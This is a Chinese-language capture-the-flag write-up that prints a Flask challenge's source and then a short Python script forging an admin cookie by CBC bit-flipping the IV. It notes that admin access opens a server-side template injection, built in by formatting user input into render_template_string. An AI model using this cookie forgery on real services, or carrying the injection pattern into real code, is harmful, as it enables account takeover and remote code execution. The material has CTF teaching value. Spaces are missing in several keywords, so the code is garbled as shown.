注册后登陆得到源码

import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing importDict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
)

app = Flask(__name__)
app.secret_key = KEY


@dataclass(kw_only=True)
classAPPUser:
    name: str
    password_raw: str
    register_time: int


#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}


defvalidate_cookie(cookie: str) -> bool:
    ifnot cookie:
        returnFalse

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        returnFalse

    iflen(cookie_encrypted) < 32:
        returnFalse

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        cookie_json = cipher.decrypt(padded)
    except ValueError:
        returnFalse

    try:
        _ = json.loads(cookie_json)
    except Exception:
        returnFalse

    returnTrue


defparse_cookie(cookie: str) -> Tuple[bool, str]:
    ifnot cookie:
        returnFalse, ""

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        returnFalse, ""

    iflen(cookie_encrypted) < 32:
        returnFalse, ""

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(padded)
        cookie_json_bytes = unpad(decrypted, 16)
        cookie_json = cookie_json_bytes.decode()
    except ValueError:
        returnFalse, ""

    try:
        cookie_dict = json.loads(cookie_json)
    except Exception:
        returnFalse, ""

    returnTrue, cookie_dict.get("name")


defgenerate_cookie(user: APPUser) -> str:
    cookie_dict = asdict(user)
    cookie_json = json.dumps(cookie_dict)
    cookie_json_bytes = cookie_json.encode()
    print(cookie_json_bytes)
    iv = os.urandom(16)
    padded = pad(cookie_json_bytes, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()


@app.route("/")
defindex():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))


@app.route("/register", methods=["GET", "POST"])
defregister():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
deflogin():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")


@app.route("/home")
defhome():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    ifnot valid ornot current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    ifnot user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">Welcome, %s !</h2>
        <div class="text-center">
            Your payload: %s
        </div>
        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">server code (encoded)</h2>
        <div class="text-center" style="word-break:break-all;">
        {%% raw %%}
            %s
        {%% endraw %%}
        </div>
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)


@app.route("/logout")
deflogout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp


if __name__ == "__main__":
    app.run()
可以知道，伪造用户成admin后就能SSTI了

cbc翻转攻击伪造Cookie

先注册一个 Admin 的用户，然后将 A 翻转成 a

from base64 import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from secret import KEY, ADMIN_PASSWORD

defAESdecode(cookie):
    cookie_encrypted = b64decode(cookie)
    iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(padded)
    cookie_json_bytes = unpad(decrypted, 16)
    cookie_json = cookie_json_bytes
    print(cookie_json)

defcbc(cookie):
    cookie_encrypted = b64decode(cookie)
    iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
    iv = list(iv)
    iv[10] = iv[10] ^ ord('A') ^ ord('a')
    cookie_encrypted = bytes(iv) + padded
    print(b64encode(cookie_encrypted))
    # AESdecode(b64encode(cookie_encrypted))

# username=Admin&password=123

cookie = 'c2FqS0gqkK+sRiTad+vH2fYJD6ehDRTb2vcvtxSCiwQsga7bHbvAWWX5WJpIpBiWibAIWRdwRy+cmoee2yyq5uUnwvpPBTROyE6Ap+OE6crWItTtyYAXGP6TtghDiiZN'
# AESdecode(cookie)
cbc(cookie)
修改cookie即可成为admin用户，ssti随便拿个payload就行

